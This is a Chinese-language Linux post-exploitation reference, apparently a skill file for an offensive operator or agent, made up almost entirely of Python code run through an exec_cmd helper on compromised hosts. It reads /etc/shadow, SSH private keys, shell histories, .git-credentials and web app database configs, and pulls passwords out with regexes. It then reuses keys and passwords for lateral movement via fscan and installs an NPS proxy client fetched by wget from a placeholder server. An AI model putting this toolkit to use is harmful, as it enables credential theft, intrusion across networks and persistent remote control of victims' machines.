# Linux 攻击参考

## 1. 信息收集

### 1.1 系统信息

```python
# Linux 系统信息一键收集
commands = [
    "id",
    "uname -a",
    "cat /etc/os-release",
    "cat /etc/passwd",
    "cat /etc/shadow 2>/dev/null",
    "ps aux",
    "ss -tlnp",
    "env",
    "cat /etc/crontab 2>/dev/null",
    "crontab -l 2>/dev/null",
    "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null",
    "cat /proc/version",
    "df -h",
]
for cmd in commands:
    print(f"\n{'='*60}\n[*] {cmd}\n{'='*60}")
    print(exec_cmd(cid, cmd))
```

关键解析点：
- `id` → 当前用户和组（root？sudo组？docker组？）
- `uname -a` → 内核版本（匹配内核提权CVE）
- `/etc/passwd` → 可登录用户列表（shell 非 /nologin 和 /false）
- `ps aux` → 运行服务（Web、DB、Docker、K8s组件）
- `ss -tlnp` → 监听端口（发现内部服务）
- `env` → 环境变量（可能包含密码、API Key、K8s配置）

### 1.2 网络信息

```python
net_cmds = [
    "ip a",                          # 网卡信息（多网卡=跳板）
    "ip route",                      # 路由表（可达网段）
    "arp -a 2>/dev/null || ip neigh", # ARP 表（已通信主机）
    "cat /etc/hosts",                # 主机名映射
    "cat /etc/resolv.conf",          # DNS 配置
    "iptables -L -n 2>/dev/null",    # 防火墙规则
    "cat /etc/network/interfaces 2>/dev/null",
    "cat /etc/sysconfig/network-scripts/ifcfg-* 2>/dev/null",
]
```

多网卡主机是关键跳板——发现多网卡后：
1. 记录所有网段
2. 未扫描网段 → 推送 fscan 扫描
3. 搭建代理 → 引用 nps-operator skill 创建 SOCKS5

### 1.3 敏感文件搜索

```python
# SSH 相关
ssh_cmds = [
    "ls -la ~/.ssh/ 2>/dev/null",
    "cat ~/.ssh/id_rsa 2>/dev/null",
    "cat ~/.ssh/id_ed25519 2>/dev/null",
    "cat ~/.ssh/known_hosts 2>/dev/null",
    "cat ~/.ssh/config 2>/dev/null",
    "cat ~/.ssh/authorized_keys 2>/dev/null",
    # 其他用户的 SSH 密钥（需要权限）
    "find /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
    "find /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
]

# 历史命令（高价值）
history_cmds = [
    "cat ~/.bash_history 2>/dev/null",
    "cat ~/.zsh_history 2>/dev/null",
    "cat /root/.bash_history 2>/dev/null",
    "find /home -name '.bash_history' -exec echo '--- {} ---' \\; -exec cat {} \\; 2>/dev/null",
]

# 配置文件
config_cmds = [
    "cat ~/.git-credentials 2>/dev/null",
    "find / -name '.env' -not -path '*/node_modules/*' 2>/dev/null | head -20",
    "find /etc -name '*.conf' | xargs grep -l 'password' 2>/dev/null | head -20",
    "find /var/www -name '*.php' -o -name '*.py' -o -name '*.js' | xargs grep -il 'password\\|passwd\\|db_pass' 2>/dev/null | head -20",
    "cat /etc/my.cnf 2>/dev/null",
    "cat /etc/redis.conf 2>/dev/null | grep requirepass",
]
```

### 1.4 容器/云环境检测

```python
# 检测是否在容器中
container_checks = [
    "cat /proc/1/cgroup 2>/dev/null | grep -i 'docker\\|lxc\\|kubepods'",
    "ls -la /.dockerenv 2>/dev/null",
    "cat /proc/self/mountinfo 2>/dev/null | grep -i 'docker\\|overlay'",
    "echo $KUBERNETES_SERVICE_HOST",
    "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50",
]
for cmd in container_checks:
    result = exec_cmd(cid, cmd)
    if result.strip():
        print(f"[!] 容器环境检测命中: {cmd}")
        print(f"    → 请阅读 references/cloud-native.md")
        break
```

---

## 2. 凭据收集

### 2.1 SSH 密钥

```python
# 收集所有用户的 SSH 密钥
ssh_keys = exec_cmd(cid, "find /home /root -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null")
for key_path in ssh_keys.strip().split('\n'):
    if key_path:
        key_content = exec_cmd(cid, f"cat {key_path}")
        print(f"\n[+] 密钥: {key_path}")
        download_file(cid, key_path, f"./keys/{key_path.replace('/', '_')}")

# 解析 known_hosts（找可达的主机）
known_hosts = exec_cmd(cid, "cat ~/.ssh/known_hosts 2>/dev/null")
# known_hosts 可能被 hash，但有些系统用明文
# 配合 SSH config 分析跳板关系
ssh_config = exec_cmd(cid, "cat ~/.ssh/config 2>/dev/null")
```

### 2.2 历史命令分析

```python
# 自动提取历史命令中的凭据
history = exec_cmd(cid, "cat ~/.bash_history 2>/dev/null")

import re
# 提取 SSH 连接
ssh_conns = re.findall(r'ssh\s+(?:-[^\s]+\s+)*(\S+@\S+)', history)
# 提取 MySQL 连接（可能包含密码）
mysql_conns = re.findall(r'mysql\s+.*?-p(\S+)', history)
# 提取 curl/wget 中的认证信息
curl_creds = re.findall(r'curl\s+.*?-u\s+(\S+:\S+)', history)
# 提取 sshpass
sshpass_creds = re.findall(r'sshpass\s+-p\s+["\']?(\S+)["\']?', history)
# 提取 export 的密码变量
env_passwords = re.findall(r'export\s+\w*(?:PASS|PWD|PASSWORD|SECRET|KEY)\w*\s*=\s*["\']?(\S+)', history, re.I)

print("[+] SSH 连接记录:", ssh_conns)
print("[+] MySQL 密码:", mysql_conns)
print("[+] HTTP 认证:", curl_creds)
print("[+] sshpass 密码:", sshpass_creds)
print("[+] 环境变量密码:", env_passwords)
```

### 2.3 配置文件密码

```python
# Web 应用数据库配置
db_configs = [
    "/var/www/html/wp-config.php",          # WordPress
    "/var/www/html/config/database.yml",     # Rails
    "/var/www/html/application/config/database.php",  # CodeIgniter
    "/var/www/html/.env",                    # Laravel/Node
    "/var/www/html/config.php",              # 通用
    "/opt/*/config*",                        # 应用配置
]
for conf in db_configs:
    result = exec_cmd(cid, f"cat {conf} 2>/dev/null")
    if result.strip() and "No such file" not in result:
        print(f"\n[+] 配置文件: {conf}")
        print(result)

# shadow 文件 hash 提取（需 root）
shadow = exec_cmd(cid, "cat /etc/shadow 2>/dev/null")
if shadow.strip() and "Permission denied" not in shadow:
    print("[+] /etc/shadow 可读！")
    # 提取有密码的用户
    for line in shadow.strip().split('\n'):
        parts = line.split(':')
        if len(parts) > 1 and parts[1] not in ('*', '!', '!!', ''):
            print(f"  [hash] {parts[0]}:{parts[1]}")
    # 本地破解: john shadow.txt --wordlist=wordlist.txt
```

---

## 4. 横向移动

### 3.1 SSH 密钥复用

```python
# 用收集的密钥尝试登录 known_hosts 中的主机
# 生成批量测试脚本
known_hosts = exec_cmd(cid, "cat ~/.ssh/known_hosts 2>/dev/null")
keys = exec_cmd(cid, "find /home /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null")

for host in parse_known_hosts(known_hosts):
    for key in keys.strip().split('\n'):
        # 通过 NPS exec_cmd 执行 SSH 连接测试
        result = exec_cmd(cid, f"ssh -i {key} -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@{host} 'hostname && id' 2>/dev/null")
        if "root" in result or "uid=" in result:
            print(f"[+] 成功: {key} → root@{host}")
```

### 3.2 密码复用

```python
# 收集到密码后，对网段内 SSH 批量尝试
# fscan SSH 弱口令扫描
exec_cmd(cid, 'echo "{password}" > /tmp/pwd.txt')
exec_cmd(cid, '/tmp/fscan_linux_amd64 -h {target_segment} -m ssh -pwdf /tmp/pwd.txt -o /tmp/ssh_result.txt')
result = exec_cmd(cid, 'cat /tmp/ssh_result.txt')
```

### 3.3 新主机 NPS 上线

```python
# 方式1：通过已控主机 SSH 执行上线命令
exec_cmd(cid, f'ssh -i {key} root@{target} "wget http://<NPS_IP>:8024/files/npc_linux_amd64 -O /tmp/npc && chmod +x /tmp/npc && nohup /tmp/npc -server=<NPS_IP>:8024 -vkey=auto > /dev/null 2>&1 &"')

# 方式2：通过级联代理（目标机器不能直接访问 NPS 服务端）
# ============================================================
# 如果目标在二级内网，需要通过一级机器级联
# 请使用 nps-operator skill 在一级机器上搭建级联
# 然后目标机器通过一级机器的 44944 端口上线：
# wget http://<一级机器IP>:44944/files/npc_linux_amd64 -O /tmp/npc
# chmod +x /tmp/npc && nohup /tmp/npc -server=<一级机器IP>:44944 -vkey=auto &
# ============================================================
```
